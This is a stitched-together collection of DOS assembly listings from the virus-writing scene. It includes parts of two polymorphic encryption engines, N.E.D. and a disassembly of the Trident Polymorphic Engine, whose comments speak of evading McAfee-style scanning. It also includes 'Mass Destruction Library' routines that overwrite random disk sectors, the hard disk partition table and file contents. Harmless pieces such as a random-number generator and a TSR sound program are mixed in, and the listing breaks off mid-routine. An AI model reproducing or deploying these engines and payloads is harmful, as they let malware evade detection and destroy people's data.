                mov     bl,byte ptr [word_adj_table + bx]  ; Table look-up
                jmp     short get_rnd_num       ; Ok, get a random number now
byte_index_0:   mov     bl,byte ptr [byte_adj_table + bx]  ; Table look-up
get_rnd_num:    mov     ax,7                    ; Select a random number
                call    rand_num                ; between 0 and 6
                shl     ax,1                    ; Convert AX into word index
                lea     bp,word ptr [jump_table]  ; BP points to jump table
                add     bp,ax                   ; BP now points to the offset
                mov     ax,word ptr [bp]        ; AX holds the jump offset
                add     ax,si                   ; Adjust by our own offset
                mov     word ptr [tmp_jmp_store],ax  ; Store in scratch variable
                mov     ax,0FFFFh               ; Select a random number
                call    rand_num                ; between 0 and 65564
                xchg    bp,ax                   ; Place random number in BP
                jmp     word ptr [tmp_jmp_store]; JuMP to a load routine!
load_move:      xchg    dx,bp                   ; Swap DX and BP
                call    make_mov                ; Load BP (random) in register
                call    add_nop                 ; Add a do-nothing instruction?
                xchg    dx,bp                   ; DX now holds real value
                jmp     short make_mov          ; Load real value in reigster
load_sub:       add     dx,bp                   ; Add random value to load value
                call    make_mov                ; Create a MOV instruction
                call    add_nop                 ; Add a do-nothing instruction?
                mov     ah,0E8h                 ; We're doing a SUB
                jmp     short make_add_sub      ; Create the SUB instruction
load_add:       sub     dx,bp                   ; Sub. random from load value
                call    make_mov                ; Create a MOV instruction
                call    add_nop                 ; Add a do-nothing instruction?
                mov     ah,0C0h                 ; We're doing an ADD
                jmp     short make_add_sub      ; Create the ADD instruction
load_xor:       xor     dx,bp                   ; XOR load value by random
                call    make_mov                ; Create a MOV instruction
                call    add_nop                 ; Add a do-nothing instruction?
                mov     ah,0F0h                 ; We're doing an XOR
                jmp     short make_add_sub      ; Create the XOR instruction
load_not:       not     dx                      ; Two's-compliment DX
                call    make_mov                ; Create a MOV instruction
                call    add_nop                 ; Add a do-nothing instruction?
load_not2:      mov     al,0F6h                 ; We're doing a NOT/NEG
                add     al,cl                   ; If it's a word, add one
                stosb                           ; Store the byte
                mov     al,0D0h                 ; Initialize the ModR/M byte
                add     al,bl                   ; Add back the register info
                stosb                           ; Store the byte
                ret                             ; Return to caller
load_neg:       neg     dx                      ; One's-compliment DX
                call    make_mov                ; Create a MOV instruction
                add     bl,08h                  ; Change the NOT into a NEG
                jmp     short load_not2         ; Reuse the above code

make_mov:       mov     al,0B0h                 ; Assume it's a byte for now
                add     al,bl                   ; Adjust by register ModR/M
                jcxz    store_mov               ; If we're doing a byte, go on
                add     al,008h                 ; Otherwise, adjust for word
store_mov:      stosb                           ; Store the OP byte
                mov     ax,dx                   ; AX holds the load value
put_byte_or_wd: jcxz    store_byte              ; If it's a byte, store it
                stosw                           ; Otherwise store a whole word
                ret                             ; Return to caller
store_byte:     stosb                           ; Store the byte in the code
                ret                             ; Return to caller

make_add_sub:   mov     al,080h                 ; Create the OP byte
                add     al,cl                   ; If it's a word, add one
                stosb                           ; Store the byte
                mov     al,ah                   ; AL now holds ModR/M byte
                add     al,bl                   ; Add back the register ModR/M
                stosb                           ; Store the byte in the code
                xchg    bp,ax                   ; AX holds the ADD/SUB value
                jmp     short put_byte_or_wd    ; Reuse the above code

_tmp_jmp_store  dw      ?                       ; Pointer: temp. storage
_jump_table     dw      load_sub - ned_start, load_add - ned_start
                dw      load_xor - ned_start, load_not - ned_start
                dw      load_neg - ned_start, load_move - ned_start
                dw      make_mov - ned_start
gen_mov         endp


;******************************************************************************
; gen_add_sub
;
; Adds code to adjust a register either up or down.  A random combination
; of ADD/SUBs and INC/DECs is used to increase code variability.  Note
; that this procedure will only work on *word* registers; attempts to
; use this procedure for byte registers (AH, AL, etc.) may result in
; invalid code being generated.
;
; Arguments:    BX = ModR/M table offset for register
;               CX = Number to be added/subtracted from the register
;               DX = 0 for addition, 1 for subtraction
;               SI = offset of ned_start
;               DI = offset of storage buffer
;
; Returns:      None
;******************************************************************************

gen_add_sub     proc    near
                jcxz    exit_g_a_s              ; Exit if there's no adjustment
add_sub_loop:   call    add_nop                 ; Add a do-nothing instruction?
                cmp     cx,3                    ; Have to adjust > 3 bytes?
                ja      use_add_sub             ; If so, no way we use INC/DEC!
                test    word ptr [options],0100b; Are ADD/SUBs allowed?
                jne     use_inc_dec             ; If not, only use INC/DECs
                mov     ax,3                    ; Select a random number
                call    rand_num                ; between 0 and 2
                or      ax,ax                   ; Does AX = 0?
                je      use_add_sub             ; If so, use ADD or SUB
use_inc_dec:    mov     al,byte ptr [word_adj_table + bx]  ; Table look-up
                add     al,040h                 ; It's an INC...
                or      dx,dx                   ; Are we adding?
                je      store_it0               ; If so, store it
                add     al,08h                  ; Otherwise create a DEC
store_it0:      stosb                           ; Store the byte
                dec     cx                      ; Subtract one fromt total count
                jmp     short cxz_check         ; Finish off the loop
use_add_sub:    mov     ax,2                    ; Select a random number
                call    rand_num                ; between 0 and 1
                shl     ax,1                    ; Now it's either 0 or 2
                mov     bp,ax                   ; Save the value for later
                add     al,081h                 ; We're going to be stupid
                stosb                           ; and use an ADD or SUB instead
                mov     al,byte ptr [word_adj_table + bx]  ; Table look-up
                add     al,0C0h                 ; It's an ADD...
                or      dx,dx                   ; Are we adding?
                je      store_it1               ; If so, store it
                add     al,028h                 ; Otherwise create a SUB
store_it1:      stosb                           ; Store the byte
                mov     ax,cx                   ; Select a random number
                call    rand_num                ; between 0 and (CX - 1)
                inc     ax                      ; Ok, add back one
                or      bp,bp                   ; Does BP = 0?
                je      long_form               ; If so, it's the long way
                stosb                           ; Store the byte
                jmp     short sub_from_cx       ; Adjust the count now...
long_form:      stosw                           ; Store the whole word
sub_from_cx:    sub     cx,ax                   ; Adjust total count by AX
cxz_check:      or      cx,cx                   ; Are we done yet?
                jne     add_sub_loop            ; If not, repeat until we are
exit_g_a_s:     ret                             ; Return to caller
gen_add_sub     endp


;******************************************************************************
; random_fill
;
; Pads out the decryption with random garbage; this is only enabled if
; bit 3 of the options byte is set.
;
; Arguments:    SI = offset of ned_start
;               DI = offset of storage buffer
;
; Returns:      None
;******************************************************************************

random_fill     proc    near
                test    word ptr [options],01000b  ; Are we allowing this?
                jne     exit_r_f                ; If not, don't add garbage
                mov     ax,2                    ; Select a random number
                call    rand_num                ; between 0 and 1
                xchg    cx,ax                   ; Wow!  A shortcut to save
                jcxz    exit_r_f                ; a byte!  If AX = 0, exit
                mov     ax,101                  ; Select a random number
                call    rand_num                ; between 0 and 100
                xchg    cx,ax                   ; Transfer to CX for LOOP
                jcxz    exit_r_f                ; If CX = 0 then exit now...
                mov     al,0EBh                 ; We'll be doing a short
                stosb                           ; jump over the code...
                mov     ax,cx                   ; Let's get that value back
                stosb                           ; We'll skip that many bytes
garbage_loop:   mov     ax,0FFFFh               ; Select a random number
                call    rand_num                ; between 0 and 65534
                stosb                           ; Store a random byte
                loop    garbage_loop            ; while (--_CX == 0);
exit_r_f:       ret                             ; Return to caller
random_fill     endp


;******************************************************************************
; random_reg
;
; Returns the number of a random register.  If CX = 1, a byte register is
; used; if CX = 0, a word register is selected.
;
; Arguments:    CX = 0 for word, 1 for byte
;               SI = offset of ned_start
;               DI = offset of storage buffer
;
; Returns:      AX = register number
;               BX = register's offset in cross-off table (used_it)
;******************************************************************************

random_reg      proc    near
get_rand_reg:   mov     ax,cx                   ; Select a random number
                add     ax,7                    ; between 0 and 6 for words
                call    rand_num                ; or 0 and 7 for bytes
                mov     bx,ax                   ; Place in BX for indexing
                shr     bx,cl                   ; Divide by two for bytes only
                cmp     byte ptr [used_it + bx],0  ; Register conflict?
                jne     get_rand_reg            ; If so, try again
                ret                             ; Return to caller
random_reg      endp


;******************************************************************************
; rand_num
;
; Random number generation procedure for the N.E.D.  This procedure can
; be safely changed without affecting the rest of the module, with the
; following restrictions:  all registers that are changed must be preserved
; (except, of course, AX), and AX must return a random number between
; 0 and (BX - 1).  This routine was kept internal to avoid the mistake
; that MtE made, that is using a separate .OBJ file for the RNG.  (When
; a separate file is used, the RNG's location isn't neccessarily known,
; and therefore the engine can't encrypt it.  McAfee, etc. scan for
; the random-number generator.)
;
; Arguments:    BX = maximum random number + 1
;
; Returns:      AX = psuedo-random number between 0 and (BX - 1)
;******************************************************************************

rand_num        proc    near
                push    dx                      ; Save DX
                push    cx                      ; Save CX

                push    ax                      ; Save AX

                rol     word ptr [rand_val],1   ; Adjust seed for "randomness"
                add     word ptr [rand_val],0754Eh  ; Adjust it again

                xor     ah,ah                   ; BIOS get timer function
                int     01Ah

                xor     word ptr [rand_val],dx  ; XOR seed by BIOS timer
                xor     dx,dx                   ; Clear DX for division...

                mov     ax,word ptr [rand_val]  ; Return number in AX
                pop     cx                      ; CX holds max value
                div     cx                      ; DX = AX % max_val
                xchg    dx,ax                   ; AX holds final value

                pop     cx                      ; Restore CX
                pop     dx                      ; Restore DX
                ret                             ; Return to caller

_rand_val       dw      0                       ; Seed for generator
rand_num        endp

ned_end         label   near                    ; The end of the N.E.D.

                end

;;;;;

;POT_SHOT - module for Mass Destruction Library
;written by Evil Avatar
; Destruye un sector al azar del drive default

        call rnd_num
pot_shot:
        push cx
        push dx               ;save regs that will be changed
        push ax               ;save sector number
        mov ax, 0dh
        int 21h               ;reset disk
        mov ah, 19h
        int 21h               ;get default disk
        pop dx                ;put sector number in dx
        mov cx, 1
        int 26h               ;kill sector
        pop dx
        pop cx
        ret                   ;restore sectors and return

;RND_NUM - module for Mass Destruction Library
;written by Evil Avatar

rnd_num:
        push cx
        push dx               ;save regs that will be changed
        xor ax, ax
        int 1ah               ;get system time
        xchg dx, ax           ;put lower word into ax
        pop dx
        pop cx
        ret                   ;restore regs and return

;;;;;

; Prints the current screen on the printer.

        int     5h
        ret

;;;;;

;PT_TRASH - module for Mass Destruction Library
;written by Evil Avatar
; Destruye la tabla de particiones

pt_trash:
        push ax
        push bx
        push cx
        push dx               ;save regs that will be changed
        mov ax, 301h          
        xor bx, bx
        mov cx, 1             ;this is where the partition table is at
        mov dx, 80h
        int 13h               ;trash it
        pop dx
        pop cx
        pop bx
        pop ax
        ret                   ;restore regs and return

;;;;;

;Linear Congruential Pseudo-Random Number Generator

                .model  small

                .code

                public  RANDOM_SEED
                public  GET_RANDOM


;The generator is defined by the equation
;
;              X(N+1) = (A*X(N) + C) mod M
;
;where the constants are defined as
;
M               EQU     43691           ;large prime
A               EQU     M+1
C               EQU     14449           ;large prime
RAND_SEED       DW      0               ;X0, initialized by RANDOM_SEED

;Set RAND_SEED up with a random number to seed the pseudo-random number
;generator. This routine should preserve all registers! it must be totally
;relocatable!
RANDOM_SEED     PROC    NEAR
                push    si
                push    ds
                push    dx
                push    cx
                push    bx
                push    ax
                call    RS1
RS1:            pop     bx
                sub     bx,OFFSET RS1
                xor     ax,ax
                mov     ds,ax
                mov     si,46CH
                lodsw
                xor     dx,dx
                mov     cx,M
                div     cx
                mov     WORD PTR cs:[bx][RAND_SEED],dx
                pop     ax
                pop     bx
                pop     cx
                pop     dx
                pop     ds
                pop     si
                retn

RANDOM_SEED     ENDP


;Create a pseudo-random number and put it in ax. This routine must preserve
;all registers except ax!
GET_RANDOM      PROC    NEAR
                push    bx
                push    cx
                push    dx
                call    GR1
GR1:            pop     bx
                sub     bx,OFFSET GR1
                mov     ax,WORD PTR cs:[bx][RAND_SEED]
                mov     cx,A                            ;multiply
                mul     cx
                add     ax,C                            ;add
                adc     dx,0
                mov     cx,M
                div     cx                              ;divide
                mov     ax,dx                           ;remainder in ax
                mov     cs:WORD PTR [bx][RAND_SEED],ax  ;and save for next round
                pop     dx
                pop     cx
                pop     bx
                retn

GET_RANDOM      ENDP

                END

;;;;;

;SCREW_FILE - module for Mass Destruction Library
;written by Evil Avatar
.model tiny
.code
public screw_file
extrn rnd_num: near

screw_file:
        push cx
        push bx
        push ax               ;save regs that will be changed
        mov ax, 3d01h
        int 21h               ;open the file
        xchg ax, bx
        call rnd_num          
        xchg ax, cx
        mov ah, 40h
        int 21h               ;overwrite a random number of bytes
        mov ah, 3eh
        int 21h               ;close file
        pop ax
        pop bx
        pop cx
        ret                   ;restore regs and return
end screw_file

;;;;;

COMMENT @

          This is the assembly language listing for SOUND.COM, a resident
          program producing scratching sounds at regular intervals.
          The interval between two sounds is preset to 5 minutes and can
          be adjusted within a range of 1 to 60 minutes.
          Just enter SOUND /?? from the command line, where '??' means
          a number between 1 and 60.

          SOUND (C)Copyright 1988 by Joachim Schneider, Zell am See.
          All rights reserved.
@

_TEXT          SEGMENT BYTE PUBLIC 'CODE'
               ASSUME CS:_TEXT, DS:_TEXT

GENSOUND       PROC  FAR
               JMP   INST              ; jump to installation routine

RNUM_TABLE     DW    2129, 715, 300, 289, 4840, 302, 265, 298, 581, 198, 205
               DW    738, 244, 228, 314, 373, 820, 243, 4650, 360, 428, 486
               DW    384, 554, 694, 989, 528, 6361, 388, 258, 213, 314, 208
               DW    299, 409, 909, 443, 427, 558, 230, 256, 277, 233, 324
               DW    255, 202, 672, 364, 818, 239, 200, 279, 200, 240, 780
               DW    1146, 237, 372, 516, 198, 332, 395, 274, 750, 2386, 645
               DW    355, 198, 2004, 392, 933, 671, 427, 298, 201, 959, 201
               DW    590, 950, 252, 408, 1896, 1046, 1809, 259, 394, 862, 827
               DW    310, 1769, 303, 897, 211, 402, 262, 1429, 448, 1001, 225
               DW    4864, 200

LPCT           DB    0                 ; subsidiary counter for sound timing
COUNT          DW    0                 ; clock tick count
VSAVE          DD    0                 ; save area for interrupt vector
D_COUNT        DW    5460              ; alarm tick count

COMMENT * Put (1193182/freq) in BX
          put time units in CX, 1 unit is approx. 2.6 msec *

GSXX:          PUSHF
               CALL  CS:[VSAVE]        ; call former interrupt handler
               STI
               PUSH  DS
               PUSH  CS
               POP   DS                ; set DS equal to CS
               INC   COUNT             ; bump tick count
               PUSH  AX
               MOV   AX,COUNT          ; load current count value
               CMP   AX,D_COUNT        ; >= destination count ?
               POP   AX
               JB    END_IT            ; no, return from interrupt
               MOV   COUNT,0           ; re-initialize counter
               PUSH  SI
               PUSH  CX
               PUSH  AX                   ; save registers required
               MOV   SI,OFFSET RNUM_TABLE ; load frequency table offset
               IN    AL,97
               OR    AL,3
               OUT   97,AL             ; turn on speaker
S01:           MOV   AL,182
               OUT   67,AL             ; set timer to receive new count
               LODSW                   ; load next frequency value from table
               OUT   66,AL             ; set frequency count low byte
               MOV   AL,AH
               OUT   66,AL             ; set frequency count high byte
               MOV   CX,2
S03:           INC   LPCT              ; wait time unit
               JNZ   S03
               LOOP  S03               ; and repeat that
               CMP   SI,OFFSET LPCT    ; all frequencies read ?
               JB    S01               ; no, do next one
               IN    AL,97
               AND   AL,252
               OUT   97,AL             ; turn speaker off
               POP   AX
               POP   CX
               POP   SI                ; restore program registers

END_IT:        POP   DS                ; restore data segment
               IRET

         DB    'SOUND (C)Copyright 1988 by Joachim Schneider, Zell am See.'
         DB    'All rights reserved.'

INST:          CALL  EVALSW            ; evaluate runtime switch if present
               JC    INST01            ; invalid switch - quit
               MOV   AX,DS
               ADD   AX,10H
               MOV   DS,AX             ; adjust DS to exclude PSP size
               MOV   AX,351CH
               INT   21H                 ; get current INT 1Ch vector
               MOV   WORD PTR VSAVE,BX   ; save offset
               MOV   WORD PTR VSAVE+2,ES ; and segment
               MOV   DX,OFFSET GSXX      ; load new interrupt routine offset
               MOV   AX,251CH
               INT   21H               ; set new interrupt vector
               MOV   AX,3100H
               MOV   DX,OFFSET INST+100H ; load offset where resident code ends
               MOV   CL,4
               SHR   DX,CL             ; convert from bytes to paragraphs
               INC   DX                ; round value
               INT   21H               ; terminate-stay-resident
INST01:        MOV   AX,4C00H
               INT   21H               ; normal terminate in case of error
               GENSOUND ENDP

COMMENT * STR_TO_INT converts the ASCIIZ string in decimal notation
          pointed to by DS:SI to an unsigned binary 16-bit-integer.
          If an invalid digit is encountered or the value is larger
          than 0FFFFH the CY flag will be set. On return, AX contains
          the integer value. *

STR_TO_INT     PROC  NEAR
               PUSH  BX
               PUSH  CX
               PUSH  DX
               XOR   AX,AX             ; clear AX
               MOV   BH,AH
               MOV   CX,10             ; factor for multiplication
STRTI05:       LODSB                   ; load character
               OR    AL,AL             ; end-of-string ?
               JZ    STRTI01           ; yes, nothing to convert
               CMP   AL,20H            ; blank ?
               JZ    STRTI05           ; yes, skip
               CMP   AL,'0'            ; check for digit
               JB    STRTI04           ; error: can't be digit
               CMP   AL,'9'
               JA    STRTI04           ; error: can't be digit
               SUB   AL,'0'            ; convert digit to binary value
STRTI03:       MOV   BL,[SI]           ; load next character
               INC   SI                ; bump index
               OR    BL,BL             ; end-of-string ?
               JZ    STRTI01           ; yes, end conversion
               CMP   BL,'0'            ; does BL contain a digit ?
               JB    STRTI04           ; no, flag error
               CMP   BL,'9'
               JA    STRTI04           ; error - no digit
               SUB   BL,'0'            ; convert BL to binary value
               MUL   CX                ; shift current value by 10
               JC    STRTI02           ; exit if overflow
               ADD   AX,BX             ; add current digit
               JC    STRTI02           ; exit if overflow
               JMP   SHORT STRTI03     ; go read next character
STRTI04:       STC                     ; set CF to 1, i.e. flag an error
               JMP   SHORT STRTI02     ; and exit
STRTI01:       CLC                     ; no error - clear CF
STRTI02:       POP   DX
               POP   CX
               POP   BX                ; restore registers
               RET
               STR_TO_INT ENDP

COMMENT * EVALSW will interpret the given runtime switches if available.
          On return, the CY flag will be set if there was an invalid parm,
          otherwise CF is clear. *

EVALSW         PROC NEAR
               MOV   CL,DS:80H         ; get length of command tail
               XOR   CH,CH
               JCXZ  EW01              ; nothing there, exit
               MOV   DI,81H            ; point DI to 1st character of tail
               CLD
EW05:          MOV   AL,'/'
               REPNZ SCASB             ; scan command tail for slash
               JCXZ  EW01              ; none found - quit
               MOV   SI,DI             ; copy string pointer
               CALL  STR_TO_INT        ; convert string to binary integer
               OR    AX,AX             ; invalid or 0 ?
               JZ    EW04              ; yes, flag error
               CMP   AX,60             ; larger than 60 ?
               JA    EW04              ; yes, flag error
               MOV   BX,1092           ; convert minute count ...
               MUL   BX                ; ... to clock tick count
               MOV   D_COUNT+100H,AX   ; and save destination count
               JMP   SHORT EW01
EW04:          MOV   DX,OFFSET ILLPARM+100H
               MOV   AH,9
               INT   21H               ; display error message
               STC                     ; and flag error
               JMP   SHORT EW08
EW01:          CLC                     ; no error
EW08:          RET
               EVALSW ENDP

ILLPARM        DB    'Error: Minute count must be in range 1 to 60.',7,'$'

               _TEXT  ENDS
               END

;;;;;

; Rutina que muestra un texto en la pantalla

      mov dx,offset texto2
      mov ah,9
      int 021h
      ret
texto2 db 'Poner aca el texto deseado'
nosacar db '$' ; Marca el fin del texto

;;;;;

.radix 16

;=============================================================================
;                                                                            =
;                       Trident Polymorphic Engine v1.1                      =
;                       -------------------------------                      =
;                                                                            =
;               Dissassembled by: Lucifer Messiah -- ANARKICK SYSTEMS        =
;                                                                            =
;               This dissassembly uses as many of the labels from the        =
;               TPE v1.2 dissassembly as possible, to allow comparison       =
;                                                                            =
;----------------------------------------------------------------------------=
;                                                                            =
;       Trident Polymorphic Engine v1.1                                      =
;       -------------------------------                                      =
;                                                                            =
;       Input:                                                               =
;             ES      Work Segment                                           =
;             DS:DX   Code to be encrypted                                   =
;             BP      Becomes offset of TPE                                  =
;             SI      Distance to put between decryptor and code             =
;             CX      Length of code to encrypt                              =
;             AX      Bit Field Flags:  bit 0: DS will not be equal to CS    =
;                                       bit 1: insert random instructions    =
;                                       bit 2: put junk before decryptor     =
;                                       bit 3: Preserve AX with decryptor    =
;                                                                            =
;       Output:                                                              =
;             ES      Work Segment (preserved)                               =
;             DS:DX   Decryptor + encrypted code                             =
;             BP      Start of decryptor (preserved)                         =
;             DI      Length of decryptor/offset of encrypted code           =
;             CX      Length of decryptor + encrypted code                   =
;             AX      Length of encrypted code                               =
;                                                                            =
;=============================================================================

               .model tiny
               .code
                org  0

public          rnd_init
public          rnd_get
public          crypt
public          tpe_top
public          tpe_bottom

tpe_top         equ     $
                db      '[ MK / TridenT ]'      ;encryptor name

crypt:
                xor     di,di
                call    dword ptr ds:[5652h]    ;????
                push    cs                      ;save registers
                pop     ds
                mov     byte ptr flags,al
                test    al,8
                je      no_push
                mov     al,50h
                stosb

no_push:
                call    rnd_get                 ;add a few bytes to cx
                and     ax,1fh
                add     cx,ax
                push    cx                      ;save length of code
                call    rnd_get                 ;get random flags
                xchg    ax,bx

;--- Flags: -----------------------------------------------
;
; 0,1   encryption method
; 2,3   which registers to use in encryption engine
; 4     use byte or word for encrypt
; 5     MOV AL, MOV AH, or MOV AX
; 6     MOV CL, MOV CH, or MOV CX
; 7     AX or DX
; 8     count up or down
; 9     ADD/SUB/INC/DEC or CMPSW/SCASW
; A     ADD/SUB or INC/DEC
;       CMPSW or SCASW
; B     offset in XOR instrucion?
; C     LOOPNZ or LOOP
;       SUB CX or DEC CX
; D     carry with crypt ADD/SUB
; E     carry with inc ADD/SUB
; F     XOR instruction value or AX/DX
;
;----------------------------------------------------------

random:
                call    rnd_get                 ;get encryption value
                or      al,al                   ;is it a 0?
                je      random                  ;redo it if it is
                mov     word ptr xor_val,ax     ;store non-zero encryptor
                call    do_junk                 ;insert random instructions
                pop     cx
                mov     ax,0111h                ;make flags to remember which
                test    bl,20h                  ; MOV instructions are used
                jne     z0
                xor     al,07

z0:
                test    bl,0ch
                jne     z1
                xor     al,70h

z1:
                test    bl,40h
                jne     z2
                xor     ah,7

z2:
                test    bl,10h
                jne     z3
                and     al,73h

z3:
                test    bh,80h
                jne     z4
                and     al,70h

z4:
                mov     dx,ax

mov_lup:
                call    rnd_get                 ;put MOV instrucions in a
                and     ax,0fh                  ; random order
                cmp     al,0ah
                ja      mov_lup
                mov     si,ax                   ;
                push    cx                      ;test if MOV already done
                xchg    ax,cx
                mov     ax,1
                shl     ax,cl
                mov     cx,ax
                and     cx,dx
                pop     cx
                je      mov_lup
                xor     dx,ax                   ;remember which MOV done
                push    dx
                call    do_mov
                call    do_nop                  ;insert a random NOP
                pop     dx
                or      dx,dx                   ;all MOVs done?
                jne     mov_lup
                push    di                      ;save start of decryptor loop
                call    do_add_ax               ;ADD AX for loop
                call    do_nop
                test    bh,20h                  ;carry with ADD/SUB?
                je      no_clc
                mov     al,0f8h
                stosb

no_clc:
                mov     word ptr xor_offset,0
                call    do_xor                  ;place all loop instructions
                call    do_nop
                call    do_add
                pop     dx                      ;get start of decryptor loop
                call    do_loop
                test    byte ptr store_mov,8    ;insert POP AX?
                je      no_pop
                mov     al,58h
                stosb

no_pop:
                xor     ax,ax
                test    bh,01
                je      no_pop2
                mov     ax,cx
                dec     ax
                test    bl,10h
                je      no_pop2
                and     al,0feh

no_pop2:
                add     ax,di                   ;calculate loop offset
                add     ax,bp
                pop     si
                add     ax,si
                sub     ax,word ptr xor_offset
                mov     si,word ptr where_len
                test    bl,0ch               ;are BL,BH used for encryption?
                jne     v2
                mov     byte ptr es:[si],al
                mov     si,word ptr where_len2
                mov     byte ptr es:[si],ah
                jmp     short v3

v2:
                mov     word ptr es:[si],ax

v3:
                mov     dx,word ptr xor_val
                pop     si                      ;ds:si=start of code
                pop     ds
                push    di                      ;save pointer to start of code
                push    cx                      ; and length of encrypted code
                test    bl,10h                  ;byte or word?
                je      blup
                inc     cx                      ;cx=# of crypts (words)
                shr     cx,1

lup:
                lodsw                           ;encrypt code (words)
                call    do_encrypt
                stosw
                loop    lup
                jmp     short klaar

blup:
                lodsb                           ;encrypt code (bytes)
                xor     dh,dh
                call    do_encrypt
                stosb
                loop    blup

klaar:
                mov     cx,di                   ;cx=lenth decryptor + code
                pop     ax                      ;ax=length of decrypted code
                pop     di                      ;offset encrypted code
                xor     dx,dx                   ;ds:dx=decryptor + cr code
                push    es
                pop     ds
                retn

;--- Encrypt the Code -------------------------------------
 
do_encrypt:
                add     dx,word ptr cs:add_val
                test    bl,02
                jne     lup1
                xor     ax,dx
                retn

lup1:
                test    bl,01
                jne     lup2
                sub     ax,dx
                retn

lup2:
                add     ax,dx
                retn

;--- Generate MOV reg,xxxx --------------------------------
 
do_mov:
                mov     dx,si
                mov     al,byte ptr ds:mov_byte[si]
                cmp     dl,04                           ;bx?
                jne     is_not_bx
                call    add_ind

is_not_bx:
                test    dl,0ch                          ;a*?
                pushf
                jne     is_not_a
                test    bl,80h                          ;a* or d*?
                je      is_not_a
                add     al,02

is_not_a:
                call    alter                           ;insert the MOV A*
                popf
                jne     is_not_a2
                mov     ax,word ptr ds:xor_val
                jmp     short sss

is_not_a2:
                test    dl,08                           ;b*?
                jne     is_not_b
                mov     si,offset where_len
                test    dl,2
                je      is_not_bh
                add     si,2

is_not_bh:
                mov     word ptr [si],di
                jmp     short sss

is_not_b:
                mov     ax,cx                   ;c*?
                test    bl,10h                  ;byte or word encrypt?
                je      sss
                inc     ax                      ;only 1/2 the number of bytes
                shr     ax,1

sss:
                test    dl,3                   ;byte or word register?
                je      is_x
                test    dl,2                    ;*h?
                je      is_not_h
                xchg    ah,al

is_not_h:
                stosb
                retn

is_x:
                stosw
                retn

;--- Insert MOV or alternative for MOV --------------------
 
alter:
                push    bx
                push    cx
                push    ax
                call    rnd_get
                xchg    ax,bx
                pop     ax
                test    bl,3                    ;use alternative for MOV?
                je      no_alter
                push    ax
                and     bx,0fh
                and     al,8
                shl     ax,1
                or      bx,ax
                pop     ax
                and     al,7
                mov     cl,9
                xchg    ax,cx
                mul     cl
                add     ax,30c0h
                xchg    ah,al
                test    bl,4
                je      no_sub
                mov     al,28h

no_sub:
                call    maybe_2
                stosw
                mov     al,80h
                call    maybe_2
                stosb
                lea     ax,word ptr alt_code
                xchg    ax,bx
                and     ax,3
                xlat
                add     al,cl

no_alter:
                stosb
                pop     cx
                pop     bx
                retn

;--- Insert ADD AX,xxxx -----------------------------------

do_add_ax:
                push    cx
                lea     si,add_val
                mov     word ptr [si],0         ;save ADD val
                mov     ax,bx
                and     ax,8110h
                xor     ax,8010h
                jne     no_add_ax               ;use ADD?
                mov     ax,bx
                xor     ah,ah
                mov     cl,3
                div     cl
                or      ah,ah
                jne     no_add_ax               ;use ADD?
                test    bl,80h
                jne     do_81C2                 ;AX or DX?
                mov     al,5
                stosb
                jmp     short do_add0

do_81C2:
                mov     ax,0c281h
                stosw

do_add0:
                call    rnd_get
                mov     word ptr [si],ax
                stosw

no_add_ax:
                pop     cx
                retn

;--- generate encryption command --------------------------
 
do_xor:
                test    byte ptr ds:flags,1
                je      no_cs
                mov     al,2eh                  ;insert CS: instruction
                stosb

no_cs:
                test    bh,80h                  ;type of XOR command
                je      xor1
                call    get_xor
                call    do_carry
                call    save_it
                xor     ax,ax
                test    bl,80h
                je      xxxx
                add     al,10h
 
xxxx:
                call    add_dir
                test    bh,8
                jne     yyyy
                stosb
                retn

yyyy:
                or      al,80h
                stosb
                call    rnd_get
                stosw
                mov     word ptr ds:xor_offset,ax
                retn

xor1:
                mov     al,80h                  ;encrypt with value
                call    save_it
                call    get_xor
                call    do_carry
                call    xxxx
                mov     ax,word ptr ds:xor_val
                test    bl,10h
                jmp     byte_word

;--- generate increase/decrease command -------------------
 
do_add:
                test    bl,8            ;no CMPSW/SCASW if BX is used
                je      da0
                test    bh,2            ;ADD/SUB/INC/DEC or CMPSW/SCASW
                jne     do_cmpsw

da0:
                test    bh,4            ;ADD/SUB or INC/DEC?
                je      add1
                mov     al,40h          ;INC/DEC
                test    bh,01
                je      add0
                add     al,8

add0:
                call    add_ind
                stosb
                test    bl,10h
                je      return
                stosb

return:
                retn

add1:
                test    bh,40h                  ;ADD/SUB
                je      no_clc2                 ;carry?
                mov     al,0f8h                 ;insert CLC
                stosb

no_clc2:
                mov     al,83h
                stosb
                mov     al,0c0h
                test    bh,01
                je      b0627f
                mov     al,0e8h                 ;insert XXX

b0627f:
                test    bh,40h
                je      add2
                and     al,0cfh
                or      al,10h

add2:
                call    add_ind
                stosb
                mov     al,01
 
save_it:
                call    add_1
                stosb
                retn

b06293:
                test    bh,01
                je      do_cmpsw
                mov     al,0fdh                 ;add XXX
                stosb

do_cmpsw:
                test    bh,4                    ;CMPSE or SCASW?
                je      normal_cmpsw
                test    bl,4                    ;no SCASW if SI is used
                jne     do_scasw

normal_cmpsw:
                mov     al,0a6h
                jmp     short save_it

do_scasw:
                mov     al,0aeh
                jmp     short save_it

;--- generate LOOP command --------------------------------
 
do_loop:
                test    bh,01                   ;no JNE if counting down
                jne     do_loop2
                call    rnd_get
                test    al,01
                jne     cx_loop

do_loop2:
                mov     al,0e0h                 ;LOOPNZ or LOOP?
                test    bh,1ah                  ; no LOOPNZ if xor-offset
                je      l10                     ; no LOOPNZ if CMP/SCASW
                add     al,2

l10:
                stosb
                mov     ax,dx
                sub     ax,di
                dec     ax
                stosb
                retn

cx_loop:
                test    bh,10h                  ;SUB CX or DEC CX?
                jne     cx1_dec
                mov     ax,0e983h
                stosw
                mov     al,1
                stosb
                jmp     short do_jne

cx1_dec:
                mov     al,49h
                stosb

do_jne:
                mov     al,75h
                jmp     short l10

;--- add value to AL depending on register type -----------
 
add_dir:
                lea     si,word ptr dir_change
                jmp     short xx1

add_ind:
                lea     si,word ptr ind_change

xx1:
                push    bx
                shr     bl,1
                shr     bl,1
                and     bx,3
                add     al,byte ptr [bx+si]
                pop     bx
                retn

;--- move encyryption command byte to AL ------------------
 
get_xor:
                push    bx
                lea     ax,word ptr how_mode
                xchg    ax,bx
                and     ax,3
                xlat
                pop     bx
                retn

;--- change ADD to ADC ------------------------------------
 
do_carry:
                test    bl,2            ;ADD/SUB used for encryption
                je      no_ac
                test    bh,20h
                je      no_ac
                and     al,0cfh
                or      al,10h

no_ac:
                retn

;--- change AL (byte/word) --------------------------------
 
add_1:
                test    bl,10h
                je      add_1_ret
                inc     al

add_1_ret:
                retn

;--- change AL (byte/word) --------------------------------
 
maybe_2:
                call    add_1           ;can't touch this...
                cmp     al,81h
                je      maybe_not
                push    ax
